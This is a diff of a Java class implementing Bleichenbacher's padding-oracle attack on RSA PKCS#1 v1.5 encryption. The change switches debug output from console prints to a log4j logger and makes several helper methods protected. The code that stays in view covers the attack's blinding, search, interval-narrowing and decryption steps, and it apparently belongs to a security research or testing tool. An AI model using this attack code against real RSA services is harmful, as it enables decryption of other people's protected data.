@@ -13,6 +13,7 @@ import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
+import org.apache.log4j.Logger;
 import org.bouncycastle.jce.provider.BouncyCastleProvider;
 
 /**
@@ -37,6 +38,12 @@ public class BleichenbacherAttack {
     protected final int blockSize;
     protected final BigInteger bigB;
     protected final boolean msgIsPKCS;
+    
+    /**
+     * Initialize the log4j logger.
+     */
+    static Logger logger = Logger.getRootLogger();
+    
 
     public BleichenbacherAttack(final byte[] msg,
             final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
@@ -57,8 +64,8 @@ public class BleichenbacherAttack {
         }
         tmp = ((tmp / 8) - 2) * 8;
         bigB = BigInteger.valueOf(2).pow(tmp);
-        System.out.println("B computed: " + bigB);
-        System.out.println("Blocksize: " + blockSize);
+        logger.debug("B computed: " + bigB);
+        logger.debug("Blocksize: " + blockSize);
         //decryptedMsg = oracle.decrypt(encryptedMsg);
         //System.out.println("our goal: " + new BigInteger(decryptedMsg));
     }
@@ -67,9 +74,9 @@ public class BleichenbacherAttack {
         int i = 0;
         boolean solutionFound = false;
 
-        System.out.println("Step 1: Blinding");
+        logger.debug("Step 1: Blinding");
         if (this.msgIsPKCS) {
-            System.out.println("Step skipped --> "
+            logger.debug("Step skipped --> "
                     + "Message is considered as PKCS compliant.");
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
@@ -82,17 +89,17 @@ public class BleichenbacherAttack {
         i++;
 
         while (!solutionFound) {
-            System.out.println("Step 2: Searching for PKCS conforming messages.");
+            logger.debug("Step 2: Searching for PKCS conforming messages.");
             stepTwo(i);
 
-            System.out.println("Step 3: Narrowing the set of soultions.");
+            logger.debug("Step 3: Narrowing the set of soultions.");
             stepThree(i);
 
-            System.out.println("Step 4: Computing the solution.");
+            logger.debug("Step 4: Computing the solution.");
             solutionFound = stepFour(i);
             i++;
 
-            System.out.println("// Total # of queries so far: "
+            logger.debug("// Total # of queries so far: "
                     + oracle.getNumberOfQueries());
         }
     }
@@ -120,7 +127,7 @@ public class BleichenbacherAttack {
             new Interval(BigInteger.valueOf(2).multiply(bigB),
             (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
 
-        System.out.println(" Found s0 : " + si);
+        logger.debug(" Found s0 : " + si);
     }
 
     protected void stepTwo(final int i) {
@@ -138,7 +145,7 @@ public class BleichenbacherAttack {
             }
         }
 
-        System.out.println(" Found s" + i + ": " + si);
+        logger.debug(" Found s" + i + ": " + si);
     }
 
     private void stepTwoA() {
@@ -146,7 +153,7 @@ public class BleichenbacherAttack {
         boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
-        System.out.println("Step 2a: Starting the search");
+        logger.debug("Step 2a: Starting the search");
         // si = ceil(n/(3B))
         BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
         if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
@@ -171,7 +178,7 @@ public class BleichenbacherAttack {
         byte[] send;
         boolean pkcsConform = false;
 
-        System.out.println("Step 2b: Searching with more than"
+        logger.debug("Step 2b: Searching with more than"
                 + " one interval left");
 
         do {
@@ -183,12 +190,12 @@ public class BleichenbacherAttack {
         } while (!pkcsConform);
     }
 
-    private void stepTwoC() {
+    protected void stepTwoC() {
         byte[] send;
         boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
-        System.out.println("Step 2c: Searching with one interval left");
+        logger.debug("Step 2c: Searching with one interval left");
 
         // initial ri computation - ri = 2(b*(si-1)-2*B)/n
         BigInteger ri = si.multiply(m[0].upper);
@@ -201,7 +208,7 @@ public class BleichenbacherAttack {
                 m[0].lower);
         BigInteger lowerBound = step2cComputeLowerBound(ri, n,
                 m[0].upper);
-
+        
         // to counter .add operation in do while
         si = lowerBound.subtract(BigInteger.ONE);
 
@@ -283,7 +290,7 @@ public class BleichenbacherAttack {
             }
         }
 
-        System.out.println(" # of intervals for M" + i + ": " + ms.size());
+        logger.debug(" # of intervals for M" + i + ": " + ms.size());
         m = ms.toArray(new Interval[ms.size()]);
     }
 
@@ -295,7 +302,7 @@ public class BleichenbacherAttack {
             solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
 
             //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
-            System.out.println("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
+            logger.debug("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
             //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
             //}
 
@@ -330,7 +337,7 @@ public class BleichenbacherAttack {
         return lowerBound;
     }
 
-    private BigInteger step2cComputeLowerBound(final BigInteger r,
+    protected BigInteger step2cComputeLowerBound(final BigInteger r,
             final BigInteger modulus, final BigInteger upperIntervalBound) {
         BigInteger lowerBound = BigInteger.valueOf(2).multiply(bigB);
         lowerBound = lowerBound.add(r.multiply(modulus));
@@ -339,7 +346,7 @@ public class BleichenbacherAttack {
         return lowerBound;
     }
 
-    private BigInteger step2cComputeUpperBound(final BigInteger r,
+    protected BigInteger step2cComputeUpperBound(final BigInteger r,
             final BigInteger modulus, final BigInteger lowerIntervalBound) {
         BigInteger upperBound = BigInteger.valueOf(3).multiply(bigB);
         upperBound = upperBound.add(r.multiply(modulus));
